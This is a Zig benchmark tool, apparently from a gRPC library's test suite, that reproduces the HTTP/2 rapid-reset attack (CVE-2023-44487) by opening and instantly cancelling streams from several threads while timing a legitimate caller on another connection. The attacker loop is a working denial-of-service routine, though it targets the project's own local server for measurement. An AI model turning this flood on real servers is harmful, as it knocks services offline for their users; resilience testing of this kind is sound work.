//! Rapid-reset load: how much a flood of opened-then-cancelled streams costs a
//! server, and what it does to a legitimate caller on another connection.
//!
//! The attack (CVE-2023-44487) is to open a stream and reset it at once. The
//! client's own stream slot is freed immediately, so it can do this as fast as
//! it can write, while the server has to accept the stream, decode its headers
//! and start a call. This tool uses the client's own API to mount it, which is
//! the point: nothing exotic is needed.
//!
//!   reset_flood --addr 127.0.0.1:50051 [--attackers 4] [--seconds 5] [--mode reset|calls]
//!
//! `--mode calls` is the control: the same number of load generators making
//! ordinary complete calls in a loop. Whatever a flood does to the legitimate
//! caller beyond what that does is what the resets themselves cost.
//!
//! Run against `vpc_server`. Server CPU and thread count are not measured here;
//! sample /proc/<pid> around the run (see docs/notes.md for how).

const std = @import("std");
const zgrpc = @import("zgrpc");

const path = "/zgrpc.bench.Echo/Call";

const Attacker = struct {
    allocator: std.mem.Allocator,
    io: std.Io,
    address: std.Io.net.IpAddress,
    authority: []const u8,
    stop: *std.atomic.Value(bool),
    calls_mode: bool = false,
    opened: usize = 0,
    /// What ended the loop early, if anything.
    failure: ?anyerror = null,

    fn run(self: *Attacker) void {
        const client = zgrpc.Client.connect(self.allocator, self.io, self.address, self.authority, .{}) catch |err| {
            self.failure = err;
            return;
        };
        defer client.deinit();

        if (self.calls_mode) {
            while (!self.stop.load(.monotonic)) {
                var response = client.call(path, "x" ** 64, .{}) catch |err| {
                    self.failure = err;
                    return;
                };
                response.deinit();
                self.opened += 1;
            }
            return;
        }

        const fields = [_]zgrpc.Header{
            .{ .name = ":method", .value = "POST" },
            .{ .name = ":scheme", .value = "http" },
            .{ .name = ":path", .value = path },
            .{ .name = ":authority", .value = self.authority },
            .{ .name = "content-type", .value = "application/grpc+proto" },
            .{ .name = "te", .value = "trailers" },
        };
        while (!self.stop.load(.monotonic)) {
            // END_STREAM on the HEADERS: a complete, valid, empty request that
            // the server will run if it gets to it before the reset.
            const stream = client.conn.openStream(&fields, true, null) catch |err| {
                self.failure = err;
                return;
            };
            // Not ended and not reset from the peer's side, so this sends
            // RST_STREAM(CANCEL) and forgets the stream.
            stream.ended = false;
            client.conn.closeStream(stream);
            self.opened += 1;
        }
    }
};

fn percentile(sorted: []const u64, p: f64) u64 {
    if (sorted.len == 0) return 0;
    const idx: usize = @intFromFloat(@round(p * @as(f64, @floatFromInt(sorted.len - 1))));
    return sorted[@min(idx, sorted.len - 1)];
}

/// Sequential calls for `seconds`, on a connection of their own.
fn legitimate(
    allocator: std.mem.Allocator,
    io: std.Io,
    address: std.Io.net.IpAddress,
    authority: []const u8,
    seconds: u64,
    out: *std.Io.Writer,
    label: []const u8,
) !void {
    const client = try zgrpc.Client.connect(allocator, io, address, authority, .{});
    defer client.deinit();

    var samples: std.ArrayList(u64) = .empty;
    defer samples.deinit(allocator);
    var failures: usize = 0;

    const payload = "x" ** 64;
    for (0..100) |_| {
        var r = try client.call(path, payload, .{});
        r.deinit();
    }

    const begin = std.Io.Timestamp.now(io, .awake);
    while (true) {
        const start = std.Io.Timestamp.now(io, .awake);
        if (start.nanoseconds - begin.nanoseconds > @as(i96, seconds) * std.time.ns_per_s) break;
        var response = client.call(path, payload, .{ .deadline_ns = 2 * std.time.ns_per_s }) catch {
            failures += 1;
            continue;
        };
        const end = std.Io.Timestamp.now(io, .awake);
        response.deinit();
        try samples.append(allocator, @intCast(end.nanoseconds - start.nanoseconds));
    }

    std.mem.sort(u64, samples.items, {}, std.sort.asc(u64));
    const s = samples.items;
    try out.print("{s:<22} calls {d:>7}  failed {d:>4}  p50 {d:>7.1}us  p99 {d:>8.1}us  p999 {d:>8.1}us  max {d:>9.1}us\n", .{
        label,
        s.len,
        failures,
        @as(f64, @floatFromInt(percentile(s, 0.50))) / 1000.0,
        @as(f64, @floatFromInt(percentile(s, 0.99))) / 1000.0,
        @as(f64, @floatFromInt(percentile(s, 0.999))) / 1000.0,
        @as(f64, @floatFromInt(if (s.len > 0) s[s.len - 1] else 0)) / 1000.0,
    });
    try out.flush();
}

pub fn main(init: std.process.Init.Minimal) !void {
    const allocator = std.heap.smp_allocator;

    var addr_text: []const u8 = "127.0.0.1:50051";
    var attackers: usize = 4;
    var seconds: u64 = 5;
    var calls_mode = false;
    const args = try init.args.toSlice(allocator);
    var i: usize = 1;
    while (i < args.len) : (i += 1) {
        if (std.mem.eql(u8, args[i], "--addr") and i + 1 < args.len) {
            i += 1;
            addr_text = args[i];
        } else if (std.mem.eql(u8, args[i], "--attackers") and i + 1 < args.len) {
            i += 1;
            attackers = try std.fmt.parseInt(usize, args[i], 10);
        } else if (std.mem.eql(u8, args[i], "--seconds") and i + 1 < args.len) {
            i += 1;
            seconds = try std.fmt.parseInt(u64, args[i], 10);
        } else if (std.mem.eql(u8, args[i], "--mode") and i + 1 < args.len) {
            i += 1;
            calls_mode = std.mem.eql(u8, args[i], "calls");
        } else {
            std.debug.print("usage: reset_flood [--addr host:port] [--attackers n] [--seconds n] [--mode reset|calls]\n", .{});
            std.process.exit(2);
        }
    }

    var threaded = std.Io.Threaded.init(allocator, .{});
    defer threaded.deinit();
    const io = threaded.io();

    const colon = std.mem.lastIndexOfScalar(u8, addr_text, ':') orelse return error.InvalidAddress;
    const port = try std.fmt.parseInt(u16, addr_text[colon + 1 ..], 10);
    const address = try std.Io.net.IpAddress.parse(addr_text[0..colon], port);

    var out_buf: [1024]u8 = undefined;
    var stdout = std.Io.File.stdout().writerStreaming(io, &out_buf);
    const out = &stdout.interface;

    try legitimate(allocator, io, address, addr_text, seconds, out, "baseline");

    var stop: std.atomic.Value(bool) = .init(false);
    const workers = try allocator.alloc(Attacker, attackers);
    defer allocator.free(workers);
    const threads = try allocator.alloc(std.Thread, attackers);
    defer allocator.free(threads);
    for (workers, threads) |*w, *t| {
        w.* = .{ .allocator = allocator, .io = io, .address = address, .authority = addr_text, .stop = &stop, .calls_mode = calls_mode };
        t.* = try std.Thread.spawn(.{}, Attacker.run, .{w});
    }

    // Give the flood a moment to reach full rate before measuring against it.
    try std.Io.sleep(io, .fromMilliseconds(300), .awake);
    try legitimate(allocator, io, address, addr_text, seconds, out, if (calls_mode) "under call load" else "under flood");

    stop.store(true, .monotonic);
    for (threads) |t| t.join();

    var total: usize = 0;
    for (workers, 0..) |w, n| {
        total += w.opened;
        if (w.failure) |err| try out.print("attacker {d} stopped early: {t}\n", .{ n, err });
    }
    try out.print("attackers: {d} {s}, {d:.0}/s\n", .{
        total,
        if (calls_mode) "calls completed" else "streams opened and reset",
        @as(f64, @floatFromInt(total)) / @as(f64, @floatFromInt(seconds)),
    });
    try out.flush();
}
